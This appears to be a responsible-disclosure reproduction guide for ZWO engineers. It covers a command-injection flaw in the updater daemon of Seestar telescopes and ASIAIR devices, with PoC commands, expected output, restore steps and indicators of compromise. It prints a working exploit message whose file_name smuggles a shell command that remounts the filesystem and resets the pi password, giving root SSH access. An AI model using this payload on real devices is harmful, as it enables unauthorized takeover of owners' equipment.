# Reproduction steps

For ZWO security engineering, a minimal walk-through to reproduce the finding
on a stock device.

## Prerequisites

- Any ZWO device running the `zwoair_updater` daemon, powered on:
  - any **Seestar** smart-telescope (S30, S30P, S50) — file port 4361;
  - any **ASIAIR** (Mini, Plus, Pro) — file port 4360;
  - any **ASI camera with built-in ASIAIR** (e.g. ASI2600MC Air; presumed identical on future "ASI \<model\> Air" units) — file port 4360.

  Directly verified on Seestar S50 (fw seestar-3.2 / 2775) and ASI2600MC Air (fw 42.97). The other variants are not individually verified but share the same updater binary string set, so the same procedure applies.

- A Linux/macOS host on the same L2 segment as the device.
- Python 3.7+ with `paramiko` installed (`pip install paramiko`).

The device's IP address must be reachable. On macOS/Linux, you can find it via the iOS/Android app's settings, or via `nmap -sn 192.168.1.0/24`. The device's mDNS hostname follows its model (e.g. `seestar.local`, `2600air.local`).

All three PoC scripts accept a `--device {auto,seestar,asiair}` flag (default `auto`). Auto-detect probes both 4360 and 4361 and picks whichever responds — use this when you don't know in advance which product family you're testing. For an ASI camera with built-in ASIAIR, pass `--device asiair`.

## Step 1 — Confirm the vulnerable methods are reachable

```
$ python3 poc/probe_only.py <device_ip>                  # auto-detect
$ python3 poc/probe_only.py 192.168.1.39  --device seestar
$ python3 poc/probe_only.py 192.168.1.121 --device asiair
```

Expected output:
```
[*] auto-detect: file port 4360 open → device looks like asiair
[*] binary file channel: 4360                              # 4361 on Seestar
[*] banner: {"Event":"Version",...,"name":"ASI AIR updater","svr_ver_int":6}
[*] response to shell-metachar file_name: {...,"result":0,"code":0,"id":1}
[!] VULNERABLE: server accepted file_name containing $() ...
```

Sends a benign `x$(true)y` filename and verifies the server accepts a shell-metachar `file_name`. No state is changed on the device.

## Step 2 — Demonstrate code execution

```
$ python3 poc/poc_rce.py <device_ip>                                # default payload
$ python3 poc/poc_rce.py <device_ip> --device seestar               # force Seestar port
$ python3 poc/poc_rce.py <device_ip> --payload 'cd;date > poc.out'  # custom payload
```

Expected output:
```
[*] target: 192.168.1.121  (cmd 4350, file 4360)
[*] banner: ...
[*] response: {...,"result":0,"code":0,"id":1}
[*] event: {"Event":"Receive",...,"state":"verify_fail",...}
[+] payload fired. ...
```

The default payload runs `id > /home/pi/poc_rce.out`. To verify, on the device:

```
$ cat /home/pi/poc_rce.out
uid=1000(pi) gid=1000(pi) groups=1000(pi),...,27(sudo),...
```

(Until step 3 you don't have SSH access to verify directly. If you have physical access via the SMB share `EMMC Images`, the marker file is reachable through there once written to `/boot/Image`. Or chain a second injection that copies `/home/pi/poc_rce.out` to the share.)

## Step 3 — Establish root access

```
$ python3 poc/poc_root_shell.py <device_ip>                                   # default password 'raspberry'
$ python3 poc/poc_root_shell.py 192.168.1.39  --device seestar
$ python3 poc/poc_root_shell.py 192.168.1.121 --device asiair --password my-pw
```

Expected output:
```
[*] target: 192.168.1.121  (cmd 4350, file 4360)
[*] payload: x$(cd;R=$(echo $PATH|cut -c1);sudo mount -o remount,rw $R;...)y
[*] firing injection...
[*] verifying via SSH...
uid=1000(pi) gid=1000(pi) groups=...,27(sudo),...
Linux 2600air 4.19.111 ... armv7l GNU/Linux
[+] root access established. SSH: ssh pi@<device_ip> (password: raspberry)
```

The script sets `pi`'s password to whatever `--password` is passed (default `raspberry`), then verifies via paramiko that SSH login works.

## Step 4 — Restore the device after testing

```
$ ssh pi@<device_ip>
pi@2600air:~$ sudo mount -o remount,rw /
pi@2600air:~$ sudo passwd -l pi          # lock the password back
pi@2600air:~$ sudo mount -o remount,ro /
```

Or factory reset via the iOS/Android app.

## Reading the request on the wire

For ZWO engineers reproducing in a controlled environment, the full exploit message body that goes over TCP/4350 is:

```
{"id":1,"method":"begin_recv","params":[{"file_len":4,"file_name":"x$(cd;R=$(echo $PATH|cut -c1);sudo mount -o remount,rw $R;echo pi:raspberry|sudo chpasswd;sync;sudo mount -o remount,ro $R)y","run_update":false,"md5":"00000000000000000000000000000000"}]}\r\n
```

…followed by 4 arbitrary bytes on the binary file channel. The order is: open binary channel first, then command channel, then send the RPC, then send the 4 bytes.

## Environment notes

- The Seestar family (S30, S30P, S50) binary file channel is **TCP 4361**.
- The ASIAIR family (Mini, Plus, Pro) and ASI cameras with built-in ASIAIR (ASI2600MC Air and presumed-same successors) binary file channel is **TCP 4360**.
- All products use **TCP 4350** for the command channel.
- The two ports must be opened in order: binary file channel first, then command channel. The server pairs them by source IP. If only one is opened, `begin_recv` returns `"binary port is not connected"`.
- The PoC scripts handle the port difference automatically (`--device auto`) but accept `--device seestar` or `--device asiair` if explicit selection is desired. For an ASI camera with integrated ASIAIR, use `--device asiair`.

## Indicators of compromise (for ZWO IR)

If you're checking whether one of your devices was attacked using this primitive in the wild, look for:

- Files in `/tmp/zwo/update/` with names matching `x$(...)y` (the literal filename always has these wrappers because the filter rejects naked `$`-only filenames). These are left behind by every exploitation attempt.
- Recent modifications to `/etc/shadow` while `/` was remounted RW (the kernel logs each `mount -o remount,rw /` to dmesg; correlate timestamps).
- Unexpected entries in `/home/pi/.bash_history` (most attackers will SSH in and explore).
- Unexpected `authorized_keys` entries in `/home/pi/.ssh/`.
- Unexpected listening sockets on the device.
